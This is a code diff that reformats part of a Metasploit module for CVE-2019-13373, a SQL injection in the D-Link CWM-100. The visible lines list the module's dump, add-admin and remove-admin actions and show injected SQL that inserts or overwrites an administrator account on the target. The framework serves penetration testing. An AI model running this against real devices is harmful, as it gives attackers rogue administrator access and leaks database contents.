@@ -25,22 +25,19 @@ class MetasploitModule < Msf::Auxiliary
           or edit database informations.
         },
         'License' => MSF_LICENSE,
-        'Author' =>
-          [
-            'M3@ZionLab from DBAppSecurity',
-            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module
-          ],
-        'References' =>
-          [
-            ['CVE', '2019-13373'],
-            ['URL', 'https://unh3x.github.io/2019/02/21/D-link-(CWM-100)-Multiple-Vulnerabilities/']
-          ],
-        'Actions' =>
-          [
-            [ 'SQLI_DUMP', { 'Description' => 'Retrieve all the data from the database' } ],
-            [ 'ADD_ADMIN', { 'Description' => 'Add an administrator user' } ],
-            [ 'REMOVE_ADMIN', { 'Description' => 'Remove an administrator user' } ]
-          ],
+        'Author' => [
+          'M3@ZionLab from DBAppSecurity',
+          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module
+        ],
+        'References' => [
+          ['CVE', '2019-13373'],
+          ['URL', 'https://unh3x.github.io/2019/02/21/D-link-(CWM-100)-Multiple-Vulnerabilities/']
+        ],
+        'Actions' => [
+          [ 'SQLI_DUMP', { 'Description' => 'Retrieve all the data from the database' } ],
+          [ 'ADD_ADMIN', { 'Description' => 'Add an administrator user' } ],
+          [ 'REMOVE_ADMIN', { 'Description' => 'Remove an administrator user' } ]
+        ],
         'DefaultOptions' => { 'SSL' => true },
         'DefaultAction' => 'SQLI_DUMP',
         'DisclosureDate' => '2019-07-06'
@@ -142,11 +139,11 @@ class MetasploitModule < Msf::Auxiliary
     if sqli.run_sql(user_exists_sql).to_i == 0
       print_status 'User not found on the target, inserting'
       sqli.run_sql('insert into usertable(username,userpassword,level) values(' \
-      "'#{datastore['USERNAME']}', '#{admin_hash}', 1)")
+                   "'#{datastore['USERNAME']}', '#{admin_hash}', 1)")
     else
       print_status 'User already exists, updating the password'
       sqli.run_sql("update usertable set userpassword='#{admin_hash}' where " \
-      "username='#{datastore['USERNAME']}'")
+                   "username='#{datastore['USERNAME']}'")
     end
   end
 
